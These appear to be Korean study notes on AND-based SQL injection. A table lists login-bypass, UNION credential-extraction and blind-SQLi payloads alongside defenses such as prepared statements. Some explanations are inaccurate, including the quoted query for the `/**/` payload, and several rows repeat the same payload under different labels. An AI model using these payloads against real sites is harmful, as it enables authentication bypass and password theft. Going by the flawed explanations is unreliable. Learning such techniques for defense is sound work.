## 🪆 And SQLI

| **공격 예시**                    | **설명**                                                | **입력값**                                                               | **방어 방법**                              |
| ---------------------------- | ----------------------------------------------------- | --------------------------------------------------------------------- | -------------------------------------- |
| **기본적인 `AND` 조건 확장**         | `AND 1=1` 조건을 추가하여 쿼리의 결과를 조작하거나 인증 우회                | `username=admin' AND 1=1 --`                                          | **파라미터화된 쿼리** (Prepared Statements) 사용 |
| **로그인 우회**                   | `AND 1=1`을 사용하여 로그인 시 인증을 우회                          | `username=admin' AND 1=1 --`<br> `password=' OR 1=1 --`               | **ORM** 사용 (SQLAlchemy, Django ORM 등)  |
| **타입 비교를 통한 조건 변경**          | `AND 1=2`를 사용하여 조건을 거짓으로 만들고 쿼리 결과를 차단                | `username=admin' AND 1=2 --`                                          | **입력 검증** 및 **정규화**                    |
| **다중 조건 추가**                 | `AND 'a'='a'` 등을 사용하여 조건을 항상 참으로 만들어 쿼리 결과 변경 없이 진행   | `username=admin' AND 'a'='a' --`                                      | **최소 권한 원칙** 적용 (필요한 권한만 부여)           |
| **`UNION`을 사용한 정보 추출**       | `UNION SELECT`를 사용하여 다른 테이블의 데이터를 쿼리에 추가하고 정보를 추출     | `username=admin' UNION SELECT null, username, password FROM users --` | **에러 메시지 숨기기** (디버깅 정보 노출 방지)          |
| **숫자 비교 및 문자열 비교를 통한 조건 변경** | `AND username = 'admin'`과 같이 특정 값을 비교하여 정보 추출         | `username=admin' AND username = 'admin' --`                           | **입력 검증** 및 **정규화**                    |
| **댓글을 이용한 SQL 주입 우회**        | `AND 1=1`을 사용하여 쿼리의 끝을 주석 처리하고 SQL 주입을 통해 인증 우회       | `username=admin' AND 1=1 --`                                          | **주석 처리 방지** (주석을 사용할 수 없게 입력 필터링)     |
| **문자열 데이터베이스 정보 추출**         | `AND 1=1`을 사용하여 숫자 형식 데이터를 추출하거나 `OR`을 사용해 정보를 강제로 노출 | `username=admin' AND 1=1 --`<br> `password=' OR 1=1 --`               | **입력 길이 제한** 및 **형식 검증**               |


### **입력값 설명:**

* **`username=admin' AND 1=1 --`**: 쿼리에서 `username` 필드에 `admin` 값을 넣고, 뒤에 `AND 1=1`을 추가하여 조건을 항상 참으로 만들어 쿼리 우회. `--`은 주석을 시작해 나머지 쿼리 부분을 무시하게 함.
* **`password=' OR 1=1 --`**: `password` 필드에 `OR 1=1`을 넣어, 로그인 쿼리에서 인증을 우회하여 항상 로그인되게 만듬.
* **`username=admin' UNION SELECT null, username, password FROM users --`**: `UNION` 쿼리를 사용해 다른 테이블의 데이터를 추출하려고 시도. 예시에서는 `users` 테이블에서 `username`과 `password`를 가져오려고 함.

---

## 🧠 그 외 페이로드

```
1/**/and 3=3
```

SQL에서 `/**/`는 **주석**입니다. 즉, `1/**/and`는 `1 and`와 동일하게 처리됩니다.
따라서 최종 쿼리는 실질적으로

```sql
SELECT * FROM articles WHERE id = '1 and 3=3'
```
```
GET /search.php?s=1/**/and 3=3
```

👉 이 경우 `3=3`은 항상 참이므로, 최종 쿼리는 `WHERE id = 1 and TRUE`, 결과적으로 ID가 1인 데이터가 조회됩니다.

👉 `1/**/and 3=3 (True)` 및 `1/**/and 3=6 (False)` 처럼 T/F의 구문을 연이어 날리며 Blind SQLi로 정보를 추출할 수도 있습니다. 


---


```
1'and(select 1)
```

문자열이 주입되면 최종 SQL 쿼리는 대략 다음과 같은 형태가 됩니다

```sql
SELECT * FROM users WHERE id = '1' and (select 1)
```

👉 `'1'`은 문자열 리터럴이지만, 바로 뒤에 `AND (SELECT 1)`을 붙여 **의도적으로 SQL 문법을 깨뜨리거나, 일부 DB에서 허용되는지 확인**합니다.

👉 `SELECT 1`은 단순히 숫자 `1`을 반환하는 쿼리로, **무조건 참(TRUE)** 으로 평가됩니다.

👉 공격자가 `"에러가 나느냐", "정상 응답이 오느냐"`를 통해 **SQL 인젝션 탐지 여부를 판단**합니다.

